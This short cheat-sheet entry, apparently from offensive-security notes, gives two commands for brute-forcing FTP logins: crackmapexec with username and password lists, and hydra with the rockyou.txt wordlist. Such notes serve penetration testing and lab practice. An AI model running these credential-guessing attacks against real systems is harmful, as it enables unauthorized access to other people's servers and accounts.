# In order to bruteforce FTP service we can use two tools.

crackmapexec ftp <IP> -u <usernamelist> -p <passwordlist> [--port <PORT>] 

# However, if the list is too long, cme can trigger errors. Instead, for longer lists like rockyou.txt, we can use HYDRA:

hydra ftp://<IP> -L <usernames.txt> -P /usr/share/wordlists/rockyou.txt -I -t <THREADS>
